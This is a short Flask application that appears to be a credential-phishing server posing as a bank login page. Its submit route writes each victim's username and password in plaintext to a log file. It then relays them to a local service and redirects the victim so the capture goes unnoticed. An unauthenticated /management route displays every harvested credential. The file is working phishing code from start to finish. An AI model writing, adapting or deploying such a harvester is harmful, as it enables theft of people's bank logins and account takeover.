from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

@app.route("/")  # Creates the landing page
def bank():
    return render_template('bank.html', static_url_path='/static')

@app.route("/management")
def manager():
    # Use the new directory for log.txt
    file_path = 'C:\\Users\\rafim\\Downloads\\flask_project\\log.txt'
    with open(file_path, 'r') as file:
        return file.read()

@app.route("/submit", methods=['POST'])
def submit_form():  # Activates when user submits
    user = request.form.get('user')
    password = request.form.get('pwd')

    # Use the new directory for log.txt
    file_path = 'C:\\Users\\rafim\\Downloads\\flask_project\\log.txt'
    with open(file_path, 'a') as file:
        file.write('[user: ' + user + '\n')
        file.write('password: ' + password + ']\n\n')

    payload = {'username': user, 'password': password, 'submit': 'submit'}
    r = requests.post('http://127.0.0.1:3333', data=payload, auth=(user, password))

    result = r.url
    return redirect(result, 307)

if __name__ == '__main__':
    app.run()
